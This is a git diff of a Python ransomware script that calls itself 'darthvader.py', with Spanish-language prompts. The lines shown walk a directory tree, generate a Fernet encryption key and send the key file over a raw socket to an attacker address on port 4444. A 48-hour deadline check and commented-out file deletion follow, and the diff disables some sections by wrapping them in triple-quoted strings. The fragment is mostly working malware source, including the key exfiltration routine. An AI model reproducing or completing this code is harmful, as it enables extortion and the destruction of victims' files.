@@ -52,6 +52,7 @@ def recorrer_arbol_directorios(directory):
         print(error_message)
         logging.error(error_message)
     print(files)
+
 recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))
 
 key = Fernet.generate_key() # Generate a key
@@ -82,7 +83,7 @@ def send_file_to_host(file_path, host, port): # Send the key file to the attacke
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
         s.connect((host, port)) # Connect to the attacker's server
         s.sendall(data) # Send the file
-
+"""
 # Usage: send_file
 try:    # Send the key file to the attacker
     send_file_to_host('key.key', '172.22.9.204', 4444)
@@ -92,9 +93,10 @@ except:
 with open("encryption_time.txt", "w") as f:
     f.write(str(datetime.now()))
 # Read the encryption time from the file
+"""
 with open("encryption_time.txt", "r") as f:
     encryption_time = datetime.fromisoformat(f.read().strip())
-
+"""
 # Check if 48 hours have passed
 if datetime.now() - encryption_time > timedelta(hours=48): # 48 hours have passed
     # Check if the transfer has been made
@@ -105,3 +107,4 @@ if datetime.now() - encryption_time > timedelta(hours=48): # 48 hours have passe
 #        os.remove(file)
 #Delete the randsomware
 #os.remove("darthvader.py")
+"""
